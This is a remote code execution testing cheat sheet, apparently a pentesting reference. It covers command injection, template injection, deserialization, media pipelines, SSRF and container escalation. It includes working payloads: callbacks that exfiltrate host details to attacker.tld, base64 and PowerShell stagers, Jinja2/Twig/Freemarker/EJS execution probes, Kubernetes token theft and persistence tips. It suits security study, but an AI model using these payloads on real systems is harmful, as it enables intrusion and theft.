# REMOTE CODE EXECUTION (RCE)

## Critical

RCE leads to full server control when input reaches code execution primitives: OS command wrappers, dynamic evaluators, template engines, deserializers, media pipelines, and build/runtime tooling. Focus on quiet, portable oracles and chain to stable shells only when needed.

## Scope

- OS command execution via wrappers (shells, system utilities, CLIs)
- Dynamic evaluation: template engines, expression languages, eval/vm
- Insecure deserialization and gadget chains across languages
- Media/document toolchains (ImageMagick, Ghostscript, ExifTool, LaTeX, ffmpeg)
- SSRF→internal services that expose execution primitives (FastCGI, Redis)
- Container/Kubernetes escalation from app RCE to node/cluster compromise

## Methodology

1. Identify sinks: search for command wrappers, template rendering, deserialization, file converters, report generators, and plugin hooks.
2. Establish a minimal oracle: timing, DNS/HTTP callbacks, or deterministic output diffs (length/ETag). Prefer OAST over noisy time sleeps.
3. Confirm context: which user, working directory, PATH, shell, SELinux/AppArmor, containerization, read/write locations, outbound egress.
4. Progress to durable control: file write, scheduled execution, service restart hooks; avoid loud reverse shells unless necessary.

## Detection Channels

### Time Based

- Unix: ;sleep 1 | `sleep 1` || sleep 1; gate delays with short subcommands to reduce noise
- Windows CMD/PowerShell: & timeout /t 2 & | Start-Sleep -s 2 | ping -n 2 127.0.0.1

### Oast

- DNS: `nslookup $(whoami).x.attacker.tld` or `curl http://$(id -u).x.attacker.tld`
- HTTP beacon: `curl https://attacker.tld/$(hostname)` (or fetch to pre-signed URL)

### Output Based

- Direct: ;id;uname -a;whoami
- Encoded: ;(id;hostname)|base64; hex via xxd -p

## Command Injection

### Delimiters And Operators

- ; | || & && `cmd` $(cmd) $() ${IFS} newline/tab; Windows: & | || ^

### Argument Injection

- Inject flags/filenames into CLI arguments (e.g., --output=/tmp/x; --config=); break out of quoted segments by alternating quotes and escapes
- Environment expansion: $PATH, ${HOME}, command substitution; Windows %TEMP%, !VAR!, PowerShell $(...)

### Path And Builtin Confusion

- Force absolute paths (/usr/bin/id) vs relying on PATH; prefer builtins or alternative tools (printf, getent) when id is filtered
- Use sh -c or cmd /c wrappers to reach the shell even if binaries are filtered

### Evasion

- Whitespace/IFS: ${IFS}, $'\t', <; case/Unicode variations; mixed encodings; backslash line continuations
- Token splitting: w'h'o'a'm'i, w"h"o"a"m"i; build via variables: a=i;b=d; $a$b
- Base64/hex stagers: echo payload | base64 -d | sh; PowerShell: IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(...)))

## Template Injection

- Identify server-side template engines: Jinja2/Twig/Blade/Freemarker/Velocity/Thymeleaf/EJS/Handlebars/Pug
- Move from expression to code execution primitives (read file, run command)
- Minimal probes:
```
Jinja2: {{7*7}} → {{cycler.__init__.__globals__['os'].popen('id').read()}}
Twig: {{7*7}} → {{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
Freemarker: ${7*7} → <#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
EJS: <%= global.process.mainModule.require('child_process').execSync('id') %>
```

## Deserialization And El

- Java: gadget chains via CommonsCollections/BeanUtils/Spring; tools: ysoserial; JNDI/LDAP chains (Log4Shell-style) when lookups are reachable
- .NET: BinaryFormatter/DataContractSerializer/APIs that accept untrusted ViewState without MAC
- PHP: unserialize() and PHAR metadata; autoloaded gadget chains in frameworks and plugins
- Python/Ruby: pickle, yaml.load/unsafe_load, Marshal; seek auto-deserialization in message queues/caches
- Expression languages: OGNL/SpEL/MVEL/EL; reach Runtime/ProcessBuilder/exec

## Media And Document Pipelines

- ImageMagick/GraphicsMagick: policy.xml may limit delegates; still test legacy vectors and complex file formats
```
Example: push graphic-context\nfill 'url(https://x.tld/a"|id>/tmp/o")'\npop graphic-context
```
- Ghostscript: PostScript in PDFs/PS; `%pipe%id` file operators
- ExifTool: crafted metadata invoking external tools or library bugs (historical CVEs)
- LaTeX: \write18/--shell-escape, \input piping; pandoc filters
- ffmpeg: concat/protocol tricks mediated by compile-time flags

## Ssrf To Rce

- FastCGI: gopher:// to php-fpm (build FPM records to invoke system/exec via vulnerable scripts)
- Redis: gopher:// write cron/authorized_keys or webroot if filesystem exposed; or module load when allowed
- Admin interfaces: Jenkins script console, Spark UI, Jupyter kernels reachable internally

## Container And Kubernetes

### Docker

- From app RCE, inspect /.dockerenv, /proc/1/cgroup; enumerate mounts and capabilities (capsh --print)
- Abuses: mounted docker.sock, hostPath mounts, privileged containers; write to /proc/sys/kernel/core_pattern or mount host with --privileged

### Kubernetes

- Steal service account token from /var/run/secrets/kubernetes.io/serviceaccount; query API for pods/secrets; enumerate RBAC
- Talk to kubelet on 10250/10255; exec into pods; list/attach if anonymous/weak auth
- Escalate via privileged pods, hostPath mounts, or daemonsets if permissions allow

## Post Exploitation

- Privilege escalation: sudo -l; SUID binaries; capabilities (getcap -r / 2>/dev/null)
- Persistence: cron/systemd/user services; web shell behind auth; plugin hooks; supply chain in CI/CD
- Lateral movement: pivot with SSH keys, cloud metadata credentials, internal service tokens

## Waf And Filter Bypasses

- Encoding differentials (URL, Unicode normalization), comment insertion, mixed case, request smuggling to reach alternate parsers
- Absolute paths and alternate binaries (busybox, sh, env); Windows variations (PowerShell vs CMD), constrained language bypasses

## Validation

1. Provide a minimal, reliable oracle (DNS/HTTP/timing) proving code execution.
2. Show command context (uid, gid, cwd, env) and controlled output.
3. Demonstrate persistence or file write under application constraints.
4. If containerized, prove boundary crossing attempts (host files, kube APIs) and whether they succeed.
5. Keep PoCs minimal and reproducible across runs and transports.

## False Positives

- Only crashes or timeouts without controlled behavior
- Filtered execution of a limited command subset with no attacker-controlled args
- Sandboxed interpreters executing in a restricted VM with no IO or process spawn
- Simulated outputs not derived from executed commands

## Impact

- Remote system control under application user; potential privilege escalation to root
- Data theft, encryption/signing key compromise, supply-chain insertion, lateral movement
- Cluster compromise when combined with container/Kubernetes misconfigurations

## Pro Tips

1. Prefer OAST oracles; avoid long sleeps—short gated delays reduce noise.
2. When command injection is weak, pivot to file write or deserialization/SSTI paths for stable control.
3. Treat converters/renderers as first-class sinks; many run out-of-process with powerful delegates.
4. For Java/.NET, enumerate classpaths/assemblies and known gadgets; verify with out-of-band payloads.
5. Confirm environment: PATH, shell, umask, SELinux/AppArmor, container caps; it informs payload choice.
6. Keep payloads portable (POSIX/BusyBox/PowerShell) and minimize dependencies.
7. Document the smallest exploit chain that proves durable impact; avoid unnecessary shell drops.

## Remember

RCE is a property of the execution boundary. Find the sink, establish a quiet oracle, and escalate to durable control only as far as necessary. Validate across transports and environments; defenses often differ per code path.
